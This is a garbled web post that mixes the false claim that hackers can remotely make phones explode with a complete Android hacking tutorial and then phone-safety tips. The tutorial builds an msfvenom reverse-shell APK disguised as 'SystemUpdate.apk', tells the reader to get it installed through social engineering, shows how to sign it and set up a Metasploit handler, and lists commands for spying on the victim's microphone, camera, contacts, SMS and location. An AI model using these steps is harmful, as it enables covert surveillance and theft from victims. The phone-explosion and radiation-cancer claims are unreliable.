Akash Angle burts the myth of how a classical Mobile phones aka smarphones here of any kind which could be or can be set as a target and blasted in order to destroy it as per Command and Control Unit set by the hacker.

Mobile phones may be treated like playthings these days. However, these flashy gadgets can prove dangerous if not handled with care:-
 
How and why do mobile phone blasts happen?
 
 The most common reasons for a cell phone to explode are using it while the phone is being charged and 'call bombing'. Charging puts pressure on the motherboard of the phone, using it during charging increases this pressure manifold. This causes the cheap electronic components in some mobiles to explode. Call bombing refers to calls or missed calls received from international numbers. If one receives or calls these numbers back and the call exceeds a certain amount of time, the phone will blast. There is also a malware, or bug, found in some Android-based smartphones, that can also cause explosion by exerting extra pressure on the motherboard during charging.
 
This is as explained below for Android.
When it comes to hacking Android phones, there are lots of ways for doing so. There are apps, web portals, scripts, and whatnot. We have already seen how to hack android device with spynote.

So today we are going to guide you on how to hack android phone using Metasploit and MSFVenom.

For performing this hack using Metasploit or msfvenom, you’ll need Kali Linux OS installed in your computer and Android Phone as a target. And obviously, internet connection is a must.

Disclaimer:
Please be aware that hacking is illegal unless you have permission from the account owner and the parties involved. This post should be used as a tool to help people understand how hackers are hacking android devices with Metasploit and msfvenom. The Hacking world team shall not be held responsible if any criminal charges are brought against any person who misuses the information on this website to violate the law.

Step 1: Creating a malicious apk file

Open your KALI LINUX. Open your Terminal and type in the following command

# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.78.129 LPORT=4444 R > SystemUpdate.apk

output:-

**LHOST= YOUR IP address

**LPORT= 4444

**Use ifconfig to find your IP address if you don`t know.

# ifconfig

Step 2: Delivering APK file to the victim

You have now created your malicious spyware .apk file using Metasploit and msfvenom. It will be saved to your /home/ folder by default. Find your newly created hackingworld.apk and send it to your target (hackingworld.apk). Use social engineering to do this so that the victim does install the apk.

**If you get any signing errors or issues use the following:

Keytool (Comes Pre-Installed in Kali Linux)

keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

Jarsigner (Comes Pre-Installed in Kali Linux)

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore hackingworld.apk aliasname

jarsigner -verify -verbose -certs hackingworld.apk
Step 3: Metasploit setup

Open up a new terminal and use the following command to start Metasploit framework.

# msfconsole

Now in the Metasploit framework console type the following

msf  > use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.78.129
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit

Here

**LHOST= YOUR IP address

**LPORT= 4444

Now when the user opens up the app on his/her phone, you will get a session with that device. And whoa! The device is yours to operate. Metasploit and msfvenom are not that difficult to use but need very methodology steps that need to implement.

Step 4: Exploit..!!!

The moment the victim opens the application on their device, you will get a meterpreter shell on the Kali Linux terminal.

You have now successfully hacked the android device using Metasploit and msfvenom

Some commands you should try using Metasploit and msfvenom:

– record_mic

Records the audio from the android device and stores it on the local drive.

– webcam_snap

Lets you take the images by hacking the android camera of the device

– webcam_stream

Lets you stream live video from the hacked android camera

– dump_contacts

Lets you hack and copy all the contacts from the victim’s phone.

– dump_sms

Lets you hack the victim’s messages and stored it in a text file on your system.

– geolocate

Helps you track the hacked device by location

So, this is how hackers hack using Metasploit and msfvenom on the local network. But what if we wanted to hack android devices with Metasploit over the internet.

Note:- Screenshots are not purposely added as this is a limitation here on my system and I do not want to show more information regarding what is happening in my console.

##Precautions to be taken as per Akash Angle:- 
 
 
What care should be taken to ensure not much pressure is put on the phone?
 
 Avoid using the phone while the battery is being charged. If you wish to receive a call during this time, disconnect the phone from charger before connecting the call. Ensure it is not over-charged by removing the electric supply when the battery is fully charged. If your battery seems to have swollen, replace it immediately.
 
 
Why is it dangerous to buy cheap phones?
 
 Most cheap models, like those of Chinese make, use hardware and components that are not branded and often substandard. The quality of vital accessories such as battery and earphones are compromised which can have disastrous outcome. Such components cannot be used continuously for as long as their high-quality substitutes. Their shelf life is also shorter.
 
 
Is it more harmful to surf internet or download anything on mobile phones?
 
 Yes, because the anti-virus softwares for mobile phones are not as effective. That is why one should avoid downloading anything from a third party vendor, ie directly from the internet browser. Instead use the in-built store or market application provided by the operating system. Malware, which is software that creates a bug in the operating system of the phone, often gets downloaded with third party tools. The sites that you visit using the phone must start with an https (which means they are encrypted or safe sites).
 
 Avoid using public or unsecured Wi-Fi connections. A hacker could access the mobile device through a port that is not secured. Make sure the Bluetooth connectivity is not switched on in public places as it can be used to send malicious files which corrupt the operating system.
 
 
Are there certain precautions that must be practiced while using a mobile phone?
 
 While communicating using your cell phone, try to keep the cell phone away from the body as this would reduce the strength of the electromagnetic field of the radiations. Whenever possible, use the speaker-phone mode or a wireless blue tooth headset. For long conversations, use a landline phone.
 
 Avoid carrying your cell phone on your body at all times. When in pocket, make sure that key pad is positioned toward your body so that the transmitted electromagnetic fields move away from you rather than through you. Do not keep it near your body at night such as under pillow or a bedside table, particularly if pregnant. You can also put it on 'flight' or 'offline' mode, which stops electromagnetic emissions. Avoid using your cell phone when signal is weak or when moving at high speed, such as in car or train.
 
 
How to deal with a wet phone?
 
 After removing the phone from water, dismantle it by removing battery, SIM and memory cards and switch it off (only SIM card in case of an iPhone). Dry each component thoroughly (but gently) with a towel until the phone is dry to the touch. Then put all components in a bowl of uncooked rice in a way that all components are totally covered. If you have any silica packets (the ones that come with products like new shoes), put them in to the bowl too. Leave it there for 12-24 hours.
 
 Never use a hair dryer to try to dry the phone quicker. Drying it with a heated hair dryer can cause important parts to melt, while forcing water further into the phone. Drying it will a cold hair dryer will just force water deeper into the phone.
 
 
Why you shouldn't hold your mobile in your mouth?
 
 Using mobile phones too close to your mouth regularly or holding cell phone in your mouth frequently could lead to malignant salivary gland cancer and tumors in mouth. Regular cell phone users who speak